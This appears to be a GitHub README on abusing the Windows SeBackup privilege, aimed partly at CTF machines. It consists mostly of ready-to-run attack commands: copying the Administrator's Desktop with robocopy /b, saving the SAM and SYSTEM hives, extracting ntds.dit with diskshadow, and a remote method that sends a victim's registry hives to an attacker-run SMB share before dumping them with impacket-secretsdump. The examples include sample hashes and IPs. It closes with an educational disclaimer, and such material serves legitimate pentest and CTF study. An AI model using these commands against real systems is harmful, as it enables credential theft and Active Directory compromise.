# SeBackup-Privilege Abuse

This repository contains a script and instructions to demonstrate the abuse of the SeBackup privilege in Windows environments. The SeBackup privilege allows a user to bypass file permissions and copy files, which can be leveraged to retrieve sensitive information.

## Description

The provided script demonstrates how to:

1. Retrieve files from the Administrator's Desktop (directly get the root flag for CTF's).
2. Copying SAM and SYSTEM files for dumping local hashes.
3. Generating the ntds.dit file, which contains the Active Directory database, for dumping domain hashes.
4. Exploiting the SeBackup-Privilege remotely from local machine.

## Usage
### Prerequisites
SeBackupPrivilege enabled for the user executing the script.

## Steps and Methods to Exploit the Privilege Locally
### ---> Retrieve files from the Administrator's Desktop (directly get the root flag for CTF's)

Use the robocopy command with the /b switch to bypass file permissions and copy files from the Administrator's Desktop.

`robocopy /b C:\Users\Administrator\Desktop\ C:\`

### ---> Copying SAM and SYSTEM files for dumping local hashes
Use the reg command to save the SAM and SYSTEM file in PWD.

`reg save hklm\sam sam` <br />
`reg save hklm\system system`

### ---> Generating the ntds.dit file, which contains the Active Directory database, for dumping domain hashes

Download and move the `script.txt` file on the Windows machine:

Execute the Diskshadow utility with the prepared script and Use robocopy again to copy the ntds.dit file to PWD:

`diskshadow /s script.txt` <br />
`robocopy /b E:\Windows\ntds . ntds.dit`

 <br />
 
## Steps to Exploit the Privilege Remotely

* Clone this Python script into your local machine:

`git clone https://github.com/horizon3ai/backup_dc_registry`

* Before running the script, start an SMB server in our local machine:

`impacket-smbserver test . -smb2support`

* Run the script with password or hashes using the following command:

`python3 reg.py username:password@victim_ip backup -p '\\your_local_ip\test'` <br />
`python3 reg.py username@victim_ip -hashes aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d backup -p '\\your_local_ip\test'`

Example:

`python3 reg.py jsmith:'Spring2021'@10.0.229.1 backup -p '\\10.0.220.51\share'` <br />
`python3 reg.py svc_backup@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d backup -p '\\10.10.14.2\test'`

* Dump the credentials using `impacket-secretsdump`:

`impacket-secretsdump LOCAL -system share/SYSTEM -security test/SECURITY -sam test/SAM`

## Disclaimer

This script is provided for educational purposes only. Unauthorized access to computer systems is illegal and unethical. Use this script only on systems you own or have explicit permission to test.

## Contributing

If you have any improvements or suggestions, feel free to submit a pull request or open an issue.

